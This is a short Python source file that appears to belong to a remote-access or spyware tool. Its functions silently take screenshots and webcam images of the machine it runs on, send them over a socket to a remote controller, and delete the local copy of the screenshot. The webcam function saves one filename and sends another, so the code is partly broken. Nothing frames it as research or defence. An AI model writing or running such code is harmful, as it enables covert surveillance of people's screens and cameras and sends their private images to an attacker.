import pyautogui
import os
from ecapture import ecapture as ec

import cv2


def capture_screenshot(my_socket):
    print("[+] Taking Screenshot")
    screenshot = pyautogui.screenshot()
    print("saving Screenshot")
    screenshot.save("screen.png")
    my_socket.send_file("screen.png")
    print("[-] Removing screenshot")
    os.remove("screen.png")


def capturing_webcam(my_socket):
    print("[+] Capturing webcam")
    ec.capture(0,False,"image.jpg")
    # os.remove("screen.png")
    my_socket.send_file("img.jpg")
